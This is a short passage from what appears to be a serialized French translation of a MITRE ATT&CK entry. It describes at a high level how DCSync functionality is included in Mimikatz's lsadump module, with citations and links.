          \ comme indiqu\xE9 dans [Manipulation de compte](https://attack.mitre.org/techniques/T1098).\
          \ (Citation : InsiderThreat ChangeNTLM juillet 2017)\n\nLa fonctionnalit\xE9\
          \ DCSync a \xE9t\xE9 incluse dans le module \xAB\_lsadump\_\xBB dans [Mimikatz](https://attack.mitre.org/software/S0002).\
          \ (Citation : GitHub Mimikatz lsadump Module) Lsadump inclut \xE9galement\
